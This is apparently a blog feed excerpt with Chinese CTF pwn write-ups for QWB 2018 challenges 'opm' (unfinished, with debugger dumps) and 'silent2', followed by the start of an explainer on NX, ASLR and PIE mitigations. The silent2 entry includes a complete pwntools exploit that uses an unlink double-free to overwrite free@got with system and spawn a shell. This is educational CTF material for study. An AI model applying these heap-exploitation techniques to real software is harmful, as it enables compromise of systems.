  <entry>
    <title>强网杯2018 opm writeup</title>
    <link href="http://eternalsakura13.com/2018/03/27/opm/"/>
    <id>http://eternalsakura13.com/2018/03/27/opm/</id>
    <published>2018-03-27T08:11:18.248Z</published>
    <updated>2018-03-30T03:34:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/qiang/opm$ checksec opm</span><br><span class="line">[*] &apos;/home/parallels/ctf/qiang/opm/opm&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>Add函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-27-083349.png" alt=""><br>创建一个结构体role，如果没创建过，可以参考<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">这篇文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 m_name          dq ?</span><br><span class="line">00000010 m_length        dq ?</span><br><span class="line">00000018 m_punchNum      dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-27-084850.png" alt=""></p><p>Show<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-27-085347.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>输入name和punch count时。由于没有限制输入大小，造成栈溢出。能覆盖堆指针，堆指针随函数返回保存中bss段。<br>通过这两次的溢出就能很容易更改堆指针指向其它地址。</p><h3 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h3><p>头文件：#include <stdlib.h></stdlib.h></p><p>atoi() 函数用来将字符串转换成整数(int)，其原型为：<br>int atoi (const char * str);</p><p>【函数说明】atoi() 函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回。</p><p>【返回值】返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</p><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>待补充</p><p>正常添加role<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000000000000000</span><br><span class="line">0x5555557560f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555768c20</span><br><span class="line">0x555555768c20:0x0000555555554b30-&gt;func0x0000555555768c50-&gt;name的堆指针</span><br><span class="line">0x555555768c30:0x0000000000000070-&gt;name的长度0x0000000000000001-&gt;punch count</span><br><span class="line">存放name的chunk</span><br><span class="line">0x555555768c40:0x00000000000000000x0000000000000081</span><br><span class="line">0x555555768c50:0x41414141414141410x4141414141414141</span><br><span class="line">0x555555768c60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>第二次添加role，并进行堆溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000555555760010-&gt;被溢出修改</span><br><span class="line">0x5555557560f0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x555555768cc0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x555555554b30, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555768cf0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x4242424242424242, </span><br><span class="line">  bk = 0x4242424242424242, </span><br><span class="line">  fd_nextsize = 0x4242424242424242, </span><br><span class="line">  bk_nextsize = 0x4242424242424242</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-27-181107.png" alt=""><br>可以看到真正的堆指针应该是0x555555768cc0，而因为溢出，\x00\x10覆盖了最后两个字节，堆指针被修改为0x555555760010<br>此后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555760010</span><br><span class="line">0x555555760010:0x00000000000000000x0000555555768d00-&gt;name的堆地址</span><br><span class="line">0x555555760020:0x00000000000000810x0000000000000002</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555768d00</span><br><span class="line">0x555555768d00:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d10:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d20:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d30:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d40:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d50:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d60:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d70:0x42424242424242420x4242424242424242</span><br><span class="line">0x555555768d80:0x00000000000000100x0000000000020281</span><br><span class="line">0x555555768d90:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>第三次创建role。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;C&apos;*0x80</span><br><span class="line">payload1 = &apos;3&apos;+&apos;P&apos;*0x7f+&apos;\x10&apos;</span><br><span class="line">add(payload,payload1)</span><br></pre></td></tr></table></figure></p><p>首先,第一次栈溢出，可以看到本来v6在0x555555768d80，然后被payload溢出了一个字节，变成了0x555555768d00。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x555555768d80 FASTBIN &#123;</span><br><span class="line">  prev_size = 16, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x555555554b30, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而这个地址刚好就是第二次的name堆指针所指向的chunk。<br>于是写入之后，就变成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555768d00</span><br><span class="line">0x555555768d00:0x42424242424242420x0000555555768dc0-&gt;name堆指针</span><br><span class="line">0x555555768d10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>然后再次溢出，使得v6的值修改为0x555555760010，这是第二次的堆指针，这样修改之后，在打印函数里，就会<strong>将我们修改过后</strong>的<strong>第二次的name值</strong>，再次打印出来。<br>这样就leak出了第三次分配的name的堆地址。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-27-184721.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020E0</span><br><span class="line">0x5555557560e0:0x0000555555768c200x0000555555760010</span><br><span class="line">0x5555557560f0:0x00005555557600100x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak-got表"><a href="#leak-got表" class="headerlink" title="leak got表"></a>leak got表</h3><p>有了堆地址就可以泄露存放在堆中的函数指针，从而有了got表的地址。<br>存放函数指针的地址在p64(heap_addr‐0x30)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555768dc0-0x30</span><br><span class="line">0x555555768d90:0x0000555555554b30-&gt;函数指针0x0000000000000000</span><br><span class="line">0x555555768da0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>TODO</p><h3 id="leak-system"><a href="#leak-system" class="headerlink" title="leak system"></a>leak system</h3><p>TODO</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>TODO</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;h3 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯2018 silent2 writeup</title>
    <link href="http://eternalsakura13.com/2018/03/26/silen2/"/>
    <id>http://eternalsakura13.com/2018/03/26/silen2/</id>
    <published>2018-03-26T11:20:54.562Z</published>
    <updated>2018-03-30T19:19:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~$ checksec &apos;/home/parallels/ctf/qiang/silent2/silent2&apos; </span><br><span class="line">[*] &apos;/home/parallels/ctf/qiang/silent2/silent2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>看了一下左边的所有函数，一个用来输出的都没有，不过有system<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-112825.png" alt=""></p><p>main函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-142332.png" alt=""><br>add函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-142343.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-142535.png" alt=""><br>delete函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-142746.png" alt=""><br>edit函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-142821.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>Partial RELRO，直接改写GOT段，把free@got的地址改写为system，当调用free的时候，就可以执行system函数了。<br>在unlink的时候，有一处覆写可以利用，然后在地址0x6020c0开始处保存了堆的指针，如果该处堆的指针可以被改写，即在这里改写为free@got的地址。<br>那么在以后edit函数调用了，就可以改写指针对应地址的数据了，即改写free@got为system。</p><h3 id="堆构造"><a href="#堆构造" class="headerlink" title="堆构造"></a>堆构造</h3><p>首先创建两个堆，并free掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#4</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#5</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></p><p>然后再创建一个大小为0x210的堆，就会再次malloc出我们之前free的空间，并在这里面伪造两个chunk。<br>第一个chunk用来绕过unlink的检查条件，第二个chunk，嗯……也是用来绕过unlink的检查条件，并且在free的时候触发unlink。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0)+p64(0x101)+p64(p_addr‐0x18)+p64(p_addr‐0x10)+&apos;A&apos;*(0x100‐0x20)+p64(0x100)+p64(0x210‐0x100)</span><br><span class="line">create(0x210,payload)</span><br></pre></td></tr></table></figure></p><p>结果如图：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-161859.jpg" alt=""><br>注意这里p_addr是0x6020D8,也就是说它就指向我们fake的chunk1。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-163221.jpg" alt=""><br>然后再次delete index 4，这里就是double free，就触发了unlink，通过fake两个chunk，让我们通过Unlink的检查。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(4) # double free</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure><p>unlink检查通过之后就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><p>P就是fake_chunk1,可以看出fake_chunk1-&gt;fd-&gt;bk和fake_chunk1-&gt;bk-&gt;fd都指向fake_chunk1,所以只需要关注第二次操作即可。<br>P-&gt;fd即fake_chunk1-&gt;fd=p_addr-0x18,即0x6020C0。<br>所以unlink之后,P-&gt;bk-&gt;fd变为即0x6020C0。<br>如图：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-164129.jpg" alt=""><br>这样，我们编辑index 3就是在修改index 0处堆的指针，将这个值改为free_got_plt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modify(3,p64(free_got_plt)[0:4],&apos;1111&apos;)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p>然后再编辑index 0，因为此时这里的堆的指针已经是指向free_got_plt的了，所以此时再编辑index 0，就是在修改free_got_plt的值。<br>修改为call system的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modify(0,p64(func_addr)[0:6],&apos;2222&apos;)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p>最后我们创建一个chunk，写入/bin/sh，并free掉，此时free调用的是system函数，getshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x100,&apos;/bin/sh\x00&apos;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">delete(6)</span><br><span class="line">sleep(0.5)</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-165130.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./silent2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, content1, content2)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'sakura1328\n'</span>) <span class="comment"># 自己创建的banner.txt文件的内容</span></span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x4009C0</span></span><br><span class="line">free_got_plt = <span class="number">0x602018</span></span><br><span class="line">p_addr = <span class="number">0x6020D8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'DDDD'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'EEEEE'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(p_addr - <span class="number">0x18</span>) + p64(p_addr - <span class="number">0x10</span>) + <span class="string">'A'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(</span><br><span class="line">    <span class="number">0x210</span> - <span class="number">0x100</span>) <span class="comment"># 构造两个chunk，绕过unlink的检查</span></span><br><span class="line">create(<span class="number">0x210</span>, payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">modify(<span class="number">3</span>, p64(free_got_plt)[<span class="number">0</span>:<span class="number">4</span>], <span class="string">'1111'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">modify(<span class="number">0</span>, p64(func_addr)[<span class="number">0</span>:<span class="number">6</span>], <span class="string">'2222'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="调试中遇到的问题"><a href="#调试中遇到的问题" class="headerlink" title="调试中遇到的问题"></a>调试中遇到的问题</h2><p>gdb attach太早，结果调试cat进程去了。<br>gdb里设置跟随父进程，就可以断下来了。<br><code>set follow-fork-mode parent</code></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>wp是根据po师傅的exp写的QVQ，还有Reshahar师傅教我为什么断不下来……感谢。</p><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/silent2" target="_blank" rel="noopener">题目链接</a>和<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/silent2.i64" target="_blank" rel="noopener">我的i64文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;h3 id=&quot;double-free&quot;&gt;&lt;a href=&quot;#double-free&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="heap overlap" scheme="http://eternalsakura13.com/tags/heap-overlap/"/>
    
  </entry>
  
  <entry>
    <title>ctf pwn中的缓解机制及其原理</title>
    <link href="http://eternalsakura13.com/2018/03/25/aslr/"/>
    <id>http://eternalsakura13.com/2018/03/25/aslr/</id>
    <published>2018-03-25T07:20:12.283Z</published>
    <updated>2018-03-28T18:19:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="不可执行位-NX-Bit"><a href="#不可执行位-NX-Bit" class="headerlink" title="不可执行位 NX Bit"></a>不可执行位 NX Bit</h2><p>NX(Non-eXecute)位是一种针对 shellcode 执行攻击的保护措施, 意在更有效地识别数据区和代码区。该技术在 1997 年时被首次提出, 2004 年之后广泛应用于 Linux 与 Windows 操作系统上。众所周知, CPU 无法识别内存中的“数据”是指令还是用户数据, 如果 CPU 的 EIP 指向了攻击者控制的区域, 攻击者可以在此部署自己的 shellcode 从而控制程序的行为。而 NX 技术旨在更好地区分“数据”和“代码”.<br><strong>通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。</strong><br>在Linux 中, <strong>当装载器把程序装载进内存空间后, 将程序的.text 段标记为可执行, 而其余的数据段(.data, .bss 等)以及栈、堆均不可执行</strong>。如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃。<br>但是我们可以注意到, 尽管攻击者无法通过代码注入攻击进行利用, 其仍然无法阻止攻击者通过<strong>控制函数指针来劫持控制流的方法</strong>。而攻击者可以使用流行的代码重用攻击, 使用现有代码来进一步构造自身所需控制流, 进而完成利用。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br><code>gcc -z execstack -o test test.c</code></p><h2 id="地址空间布局随机化ASLR"><a href="#地址空间布局随机化ASLR" class="headerlink" title="地址空间布局随机化ASLR"></a>地址空间布局随机化ASLR</h2><p>ASLR(Address Space Layout Randomization,  地址空间布局随机化)技术意在将程序的内存布局随机化, 使得攻击者不能轻易地得到数据区的地址来构造攻击载荷。<strong>由于程序的堆、栈分配与共享库的装载都是在运行时进行, 系统在程序每次执行时, 随机地分配程序堆栈的地址以及共享库装载的地址。尽管它们之间的相对位置没有改变, 但每次执行的差异仍然是页级的, 攻击者将无法预测自己写入的数据区的确切虚拟地址。</strong><br>在 32 位系统中由于随机化的位数较少, 一个常用的绕过手段是通过枚举的方式, 猜测相关代码或者数据的位置, 并通过多次发送攻击载荷来不断触发程序运行。而在 64 位系统中, 因随机化位数较多, 使得通过枚举方式来猜测攻击的手段亦不可行。<br>但由于目前广泛应用在操作系统的地址随机化多为粗粒度的实现方式, 同一模块中的所有代码与数据的相对偏移固定。<strong>攻击者只需要通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露, 即可通过计算得出此模块中任意代码或者数据的地址。</strong><br>内存地址随机化机制（address space layout randomization)，有以下三种情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure></p><p>liunx下关闭ASLR的命令如下,root运行<br><code>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><h2 id="位置无关可执行文件-PIE"><a href="#位置无关可执行文件-PIE" class="headerlink" title="位置无关可执行文件 PIE"></a>位置无关可执行文件 PIE</h2><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,<strong>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定</strong>。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br>GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br>使用 PIE 技术会很大程度上影响程序和系统的性能, 因此在 Linux 系统中, 除了关键的系统程序以及共享库使用了位置无关技术外, 大部分程序在编译时都直接确定各段加载的虚地址。</p><h2 id="重定位只读-RELRO"><a href="#重定位只读-RELRO" class="headerlink" title="重定位只读 